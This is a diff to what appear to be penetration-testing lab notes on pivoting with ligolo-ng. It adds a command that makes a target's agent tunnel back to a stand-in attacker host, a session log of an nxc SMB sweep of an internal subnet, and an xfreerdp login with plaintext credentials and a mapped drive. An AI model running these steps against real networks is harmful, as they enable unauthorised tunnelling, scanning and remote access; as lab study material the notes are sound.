@@ -13,7 +13,7 @@ sudo ip link set ligolo up
 
 #### Starting the agent (target machines)
 ```
-ligolo-agent.exe -connect ATTACKER_IP:ATTACKER_PORT -ignore-cert
+agent.exe -connect ATTACKER_IP:ATTACKER_PORT -ignore-cert
 ```
 
 #### Adding the target IP route to the `ligolo` Networking device
@@ -84,5 +84,21 @@ ligolo-ng » session
 └──╼ #ip route add 10.4.171.0/24 dev ligolo
 
 // Back to the session
+
+[Agent : Unknown@MULTISERVER03] » start
+INFO[0236] Starting tunnel to Unknown@MULTISERVER03    
+
+// All ready.
+┌─[root@edu-virtualbox]─[/tmp/oscp]
+└──╼ #nxc smb 10.4.171.0/24
+SMB         10.4.171.64     445    MULTISERVER03    [*] Windows 10.0 Build 20348 x64 (name:MULTISERVER03) (domain:MULTISERVER03) (signing:False) (SMBv1:False)
+Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+┌─[root@edu-virtualbox]─[/tmp/oscp]
+└──╼ #xfreerdp /u:rdp_admin /p:'P@ssw0rd!' /cert:ignore /v:10.4.171.64 /clipboard /cert:ignore /size:1920x1080 /drive:NAME,/tmp
+[22:15:44:633] [1154920:1154921] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
+[22:15:44:635] [1154920:1154921] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
+[22:15:44:715] [1154920:1154921] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
+[22:15:44:715] [1154920:1154931] [INFO][com.freerdp.channels.rdpdr.client] - Loading device service drive [NAME] (static)
+[22:15:44:716] [1154920:1154921] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
 
 ```
